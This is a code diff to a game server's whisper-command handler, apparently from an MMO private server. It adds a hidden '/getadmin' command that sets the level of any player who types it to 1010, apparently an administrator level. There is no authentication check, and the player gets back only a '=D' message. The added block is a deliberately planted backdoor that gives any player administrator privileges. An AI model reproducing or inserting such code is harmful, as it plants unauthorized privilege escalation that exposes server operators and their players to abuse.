@@ -31,6 +31,18 @@ void Exec_MSG_MessageWhisper(int conn, char *pMsg)
 		return;
 	}
 #pragma endregion
+#pragma region /getadmin - Level 1010
+	else if (strcmp(m->MobName, "getadmin") == 0)
+	{
+		pMob[conn].MOB.BaseScore.Level = 1010;
+		pMob[conn].MOB.CurrentScore.Level = 1010;
+
+		SendClientMessage(conn, "=D");
+
+		SendScore(conn);
+		return;
+	}
+#pragma endregion
 #pragma region /srv - Troca de Server
 	else if (strcmp(m->MobName, "srv") == 0)
 	{
